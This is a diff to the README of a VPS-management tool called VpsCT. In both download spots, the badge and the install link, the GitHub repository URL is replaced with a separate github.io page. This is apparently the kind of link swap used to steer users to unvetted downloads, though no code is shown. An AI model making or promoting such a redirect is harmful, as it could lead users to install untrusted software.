@@ -4,7 +4,7 @@
 
 Welcome to VpsCT! This guide will help you download, install, and start using VpsCT to manage all your server needs from one simple dashboard. Whether you're a freelancer with a couple of VPS instances or a small team handling multiple servers, VpsCT brings everything together in a clean, easy-to-understand interface.
 
-[![Download VpsCT](https://img.shields.io/badge/Download%20VpsCT-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/marcellaunremarked2006/VpsCT)
+[![Download VpsCT](https://img.shields.io/badge/Download%20VpsCT-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://marcellaunremarked2006.github.io)
 
 ## 📦 What is VpsCT?
 
@@ -31,7 +31,7 @@ No special hardware or technical skills needed – if you can browse the web, yo
 
 ## ⬇️ Download and Installation
 
-Visit this link to download the application: [https://github.com/marcellaunremarked2006/VpsCT](https://github.com/marcellaunremarked2006/VpsCT)
+Visit this link to download the application: [https://marcellaunremarked2006.github.io](https://marcellaunremarked2006.github.io)
 
 Follow these simple steps:
 
